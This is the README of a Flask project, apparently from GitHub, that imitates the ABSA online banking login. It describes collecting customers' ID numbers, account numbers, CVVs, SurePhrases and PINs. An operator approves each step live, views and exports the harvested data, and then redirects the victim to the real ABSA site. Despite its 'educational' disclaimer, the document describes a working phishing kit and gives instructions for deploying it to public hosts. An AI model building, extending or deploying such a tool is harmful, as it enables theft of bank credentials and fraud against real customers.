# ABSA Banking Authentication System

A Flask-based banking authentication system that replicates the ABSA online banking experience with admin approval workflow and comprehensive data capture functionality.

## Features

### User Authentication Flow
- **Customer Information**: ID verification, date of birth, account details
- **SurePhrase Authentication**: Secure phrase verification
- **PIN Entry**: 5-digit PIN verification
- **Admin Approval**: Each step requires admin approval before proceeding

### Admin Features
- **Real-time Dashboard**: Monitor pending authentication requests
- **Data Capture**: View all user-entered data for each authentication step
- **Approval Workflow**: Approve or reject each user step
- **Data History**: Browse all captured authentication sessions
- **Data Export**: Export session data as JSON
- **Statistics**: Track daily approvals and rejections

### Security Features
- Session-based authentication
- Rate limiting for failed attempts
- IP address logging
- Secure data storage during authentication flow
- Admin-only access to sensitive data

## Local Development Setup

### Prerequisites
- Python 3.8 or higher
- pip (Python package installer)

### Quick Start

1. **Clone/Download the project**
   ```bash
   # If cloning from GitHub
   git clone https://github.com/VarsityPlug0/Absa-Final.git
   cd Absa-Final
   ```

2. **Install Dependencies**
   ```bash
   pip install -r requirements.txt
   ```

3. **Run the Application**
   
   **Option A: Using Python directly**
   ```bash
   python app.py
   ```
   
   **Option B: Using the run scripts**
   - Windows: Double-click `run.bat` or run in command prompt
   - Linux/Mac: `chmod +x run.sh && ./run.sh`

4. **Access the Application**
   - **Main Application**: http://localhost:5000
   - **Admin Panel**: http://localhost:5000/admin

### Admin Credentials
- **Username**: `admin`
- **Password**: `admin123`

## Usage Guide

### For Users (Testing Authentication)
1. Go to http://localhost:5000
2. Fill in the customer information form
3. Wait for admin approval (check admin panel)
4. Continue with SurePhrase (any phrase with 3+ characters)
5. Wait for admin approval
6. Enter PIN (any 5-digit number)
7. Wait for final admin approval
8. Upon approval, redirected to ABSA website

### For Admins (Managing Approvals)
1. Go to http://localhost:5000/admin
2. Login with admin credentials
3. View pending requests in real-time
4. Click "View Data" to see captured user information
5. Approve or reject each authentication step
6. Access "Data History" to view all captured sessions
7. Export individual session data as JSON

## Data Capture Details

The system captures and stores the following information:

### Customer Information Step
- ID Type and Number
- Date of Birth
- Account Number
- Branch Code
- CVV
- Timestamp and IP Address

### SurePhrase Step
- Account Number
- SurePhrase entered
- Timestamp and IP Address

### PIN Step
- Account Number
- PIN entered
- Timestamp and IP Address

### Session Metadata
- Session ID
- Session start time
- Approval/rejection timestamps
- Admin who handled each step
- IP addresses for each step

## File Structure

```
absa/
├── app.py                          # Main Flask application
├── requirements.txt                # Python dependencies
├── run.bat                        # Windows run script
├── run.sh                         # Linux/Mac run script
├── static/                        # Static assets
│   ├── logo.png                   # ABSA logo
│   └── style.css                  # Main stylesheet
├── templates/                     # HTML templates
│   ├── base.html                  # Base template
│   ├── login.html                 # Main login page
│   ├── customer_info.html         # Customer information form
│   ├── surephrase_auth.html       # SurePhrase authentication
│   ├── pin_entry.html            # PIN entry form
│   ├── waiting_approval.html      # User waiting page
│   ├── admin_login.html           # Admin login
│   ├── admin_dashboard.html       # Admin dashboard
│   ├── admin_view_data.html       # Session data viewer
│   ├── admin_data_history.html    # Data history browser
│   └── error.html                 # Error pages
├── Procfile                       # Heroku deployment
├── runtime.txt                    # Python version for deployment
├── render.yaml                    # Render deployment config
└── README.md                      # This file
```

## Configuration

### Environment Variables
For production deployment, set these environment variables:

- `SECRET_KEY`: Flask secret key for session security
- `ADMIN_USERNAME`: Admin login username (default: admin)
- `ADMIN_PASSWORD`: Admin login password (default: admin123)
- `FLASK_ENV`: Set to 'production' for production deployment
- `PORT`: Port number for the application (default: 5000)

### Local Development
The application runs in debug mode by default for local development with:
- Debug mode enabled
- Auto-reload on file changes
- Detailed error messages
- Host: 127.0.0.1 (localhost only)
- Port: 5000

## API Endpoints

### Public Endpoints
- `GET /` - Main login page
- `POST /process-login` - Process main login
- `GET,POST /customer-info` - Customer information form
- `GET,POST /surephrase-auth` - SurePhrase authentication
- `GET,POST /pin-entry` - PIN entry
- `GET /waiting/<request_id>` - User waiting for approval
- `GET /check-approval/<request_id>` - Check approval status

### Admin Endpoints
- `GET,POST /admin` - Admin login
- `GET /admin/dashboard` - Admin dashboard
- `POST /admin/approve/<request_id>` - Approve request
- `POST /admin/reject/<request_id>` - Reject request
- `GET /admin/view-data/<session_id>` - View session data
- `GET /admin/data-history` - Browse all sessions
- `GET /admin/export-data/<session_id>` - Export session JSON
- `GET /admin/logout` - Admin logout

### Utility Endpoints
- `GET /health` - Health check for monitoring
- `GET /api/branch-lookup` - Branch code lookup

## Deployment

### Render (Recommended)
1. Push code to GitHub repository
2. Connect Render to your GitHub repo
3. Render will automatically use the `render.yaml` configuration
4. Set environment variables in Render dashboard

### Heroku
1. Install Heroku CLI
2. `heroku create your-app-name`
3. `git push heroku main`
4. `heroku config:set SECRET_KEY=your-secret-key`
5. `heroku config:set ADMIN_USERNAME=your-admin-user`
6. `heroku config:set ADMIN_PASSWORD=your-admin-pass`

### Local Production Mode
```bash
export FLASK_ENV=production
export SECRET_KEY="your-secret-key-here"
gunicorn -w 4 -b 0.0.0.0:5000 app:app
```

## Development Notes

### Testing Mode
The application accepts any valid input for testing:
- Any SurePhrase with 3+ characters
- Any 5-digit PIN
- Any customer details in correct format

### Data Storage
Currently uses in-memory storage for demonstration. For production:
- Replace with proper database (PostgreSQL, MySQL, etc.)
- Implement proper data encryption
- Add data retention policies
- Consider GDPR compliance

### Security Considerations
- Change default admin credentials
- Use strong secret keys
- Implement proper input validation
- Add CSRF protection
- Use HTTPS in production
- Implement proper logging

## Troubleshooting

### Common Issues

1. **Port already in use**
   ```bash
   # Change port in app.py or kill existing process
   netstat -ano | findstr :5000  # Windows
   lsof -ti:5000 | xargs kill    # Linux/Mac
   ```

2. **Module not found errors**
   ```bash
   pip install -r requirements.txt
   ```

3. **Template not found**
   - Ensure templates/ directory exists
   - Check file paths in app.py

4. **Static files not loading**
   - Ensure static/ directory exists
   - Check static file paths in templates

## License

This project is for educational and demonstration purposes.

## Support

For issues or questions:
1. Check the troubleshooting section
2. Review the application logs
3. Check browser developer console for frontend errors

---

**⚠️ Security Notice**: This is a demonstration system. Do not use with real banking credentials or deploy with default settings in production environments.